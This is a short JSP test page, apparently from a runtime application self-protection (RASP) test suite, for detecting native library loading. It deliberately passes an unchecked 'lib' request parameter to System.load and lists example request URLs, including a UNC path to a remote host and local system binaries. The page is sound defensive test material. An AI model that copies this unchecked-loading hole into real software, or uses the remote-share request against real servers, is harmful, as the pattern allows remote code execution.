<%@page import="java.io.*" %>
<%@page import="java.util.*" %>
<%@page import="java.net.*" %>
<%@page import="net.sf.json.*" %>
    
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>	
    <meta charset="UTF-8"/>
    <title>018 - 类库加载</title>
</head>
<body>


    <h1>018 - 类库加载</h1>
    <p>目前 loadLibrary hook 点不检查文件是否存在，下面的案例只是用于触发插件调用</p>

<%!
String encodeValue(String value) 
{
    try {
        return URLEncoder.encode(value, "UTF-8");
    } catch (UnsupportedEncodingException ex) {
        throw new RuntimeException(ex.getCause());
    }
}
%>

<%

String lib = request.getParameter("lib");
String unc = "?lib=" + encodeValue("\\\\8.8.8.8\\test.ext");
String local_win = "?lib=" + encodeValue("c:\\windows\\system32\\calc.exe");
String local_lin = "?lib=/bin/ls";

if (lib != null) {
    try {
    	System.load(lib);
    } catch (Exception e) {
        out.print(e);
    }
} 
else {
%>
<p>UNC 加载: </p>
<p>curl '<a href="<%=request.getRequestURL()+unc%>" target="_blank"><%=request.getRequestURL() + unc%></a>'</p>

<p>Windows 本地加载: </p>
<p>curl '<a href="<%=request.getRequestURL()+local_win%>" target="_blank"><%=request.getRequestURL() + local_win%></a>'</p>

<p>Linux/Mac 本地加载: </p>
<p>curl '<a href="<%=request.getRequestURL()+local_lin%>" target="_blank"><%=request.getRequestURL() + local_lin%></a>'</p>


<%
}
%>
</body>
</html>

